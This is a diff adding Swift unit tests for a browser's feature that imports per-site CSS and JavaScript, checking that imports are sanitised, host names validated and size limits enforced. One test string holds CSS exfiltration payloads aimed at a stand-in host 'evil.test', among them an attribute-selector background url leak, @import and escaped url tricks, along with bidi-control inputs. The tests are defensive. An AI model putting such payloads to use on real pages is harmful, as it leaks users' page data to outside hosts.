@@ -118,6 +118,80 @@ final class BoostTests: XCTestCase {
         XCTAssertTrue(list.first { !$0.isScript }?.world === Web.world)
     }
 
+    private func imported(_ edit: (inout Boost) -> Void) -> [BoostCandidate] {
+        var b = Boost(name: "I", hosts: ["example.com"])
+        edit(&b)
+        return Boosts.parseImport((try? JSONEncoder().encode([b])) ?? Data())
+    }
+
+    func testImportedCSSLosesFetchesButKeepsDataURLs() {
+        let css = #"@import url(https://evil.test/a.css); a[href^="x"]{background:url(https://evil.test/?v=x)} b{background:URL( 'http://e/' )} c{background:image-set("https://e/a.png" 1x)} d{background:url(data:image/png;base64,AAA)} e{background:u\72l(https://e/)}"#
+        let c = imported { $0.css = css }
+        XCTAssertEqual(c.count, 1)
+        let out = c[0].boost.css
+        XCTAssertFalse(out.contains("evil.test"))
+        XCTAssertFalse(out.contains("a.png"))
+        XCTAssertFalse(out.contains("http://e/"))
+        XCTAssertFalse(out.contains("\\"), "escapes could spell url(")
+        XCTAssertFalse(out.lowercased().contains("@import"))
+        XCTAssertTrue(out.contains("url(data:image/png;base64,AAA)"))
+        // Local CSS keeps its urls.
+        var local = Boost(name: "L", hosts: ["example.com"])
+        local.css = "a{background:url(https://example.com/x.png)}"
+        XCTAssertTrue(local.stylesheet.contains("https://example.com/x.png"))
+        XCTAssertTrue(imported { $0.hide = ["a[x=y]", "b{background:url(http://e)}", "c url(http://e)"] }[0].boost.hide == ["a[x=y]"])
+    }
+
+    func testHostValidation() {
+        for bad in ["com", "co.uk", "github.io", "localhost", "foo", "a b.com", "*.example.com", "exa_mple.com", "例え.jp", "a..com", "-a.com", "x.localhost"] {
+            XCTAssertFalse(Boost.validHost(bad, subdomains: false), bad)
+        }
+        for good in ["example.com", "Sub.Example.co.uk.", "me.github.io", "1.2.3.4"] {
+            XCTAssertTrue(Boost.validHost(good, subdomains: false), good)
+        }
+        XCTAssertFalse(Boost.validHost("1.2.3.4", subdomains: true))
+        let (boosts, _) = store()
+        XCTAssertFalse(boosts.save(Boost(name: "x", hosts: ["com"])))
+    }
+
+    func testImportedSubdomainsOffUnlessTicked() {
+        let c = imported { $0.subdomains = true }
+        XCTAssertFalse(c[0].boost.subdomains)
+        XCTAssertTrue(c[0].wantsSubdomains)
+        let (a, _) = store()
+        XCTAssertFalse(a.commitImport(c, allowing: [])[0].subdomains)
+        let (b, _) = store()
+        XCTAssertTrue(b.commitImport(c, allowing: [], subdomains: [c[0].id])[0].subdomains)
+    }
+
+    func testBidiRefusedAndControlsEscaped() {
+        XCTAssertTrue(imported { $0.js = "a\u{202E}b" }.isEmpty)
+        XCTAssertTrue(imported { $0.js = "a\u{2066}b" }.isEmpty)
+        let shown = Boosts.reviewText("x\u{200B}y\u{7}\n\t")
+        XCTAssertEqual(shown.text, "x\\u{200B}y\\u{7}\n\t")
+        XCTAssertEqual(shown.hidden, 2)
+    }
+
+    func testFieldAndFileCaps() throws {
+        XCTAssertTrue(imported { $0.name = String(repeating: "n", count: Boosts.maxName + 1) }.isEmpty)
+        XCTAssertTrue(imported { $0.hide = [String(repeating: "a", count: Boosts.maxSelector + 1)] }.isEmpty)
+        XCTAssertTrue(imported { $0.hide = (0...Boosts.maxHide).map { "a\($0)" } }.isEmpty)
+        let huge = Data(repeating: 32, count: Boosts.maxImportFile + 1)
+        XCTAssertTrue(Boosts.parseImport(huge).isEmpty)
+    }
+
+    func testScriptChecksHostnameAtRunTime() {
+        let js = Boosts.wrap("run()", hosts: ["Example.com"], subdomains: false)
+        XCTAssertTrue(js.contains("location.hostname"))
+        XCTAssertTrue(js.contains("[\"example.com\"]"))
+        XCTAssertTrue(js.contains("(false &&"))
+        let (boosts, _) = store()
+        var b = Boost(name: "S", hosts: ["example.com"])
+        b.js = "run()"
+        boosts.save(b)
+        XCTAssertTrue(boosts.injections(host: "example.com", shy: false)[0].source.contains("location.hostname"))
+    }
+
     func testTrialAppliesToOneTabOnly() {
         let (boosts, _) = store()
         var b = Boost(name: "S", hosts: ["example.com"])
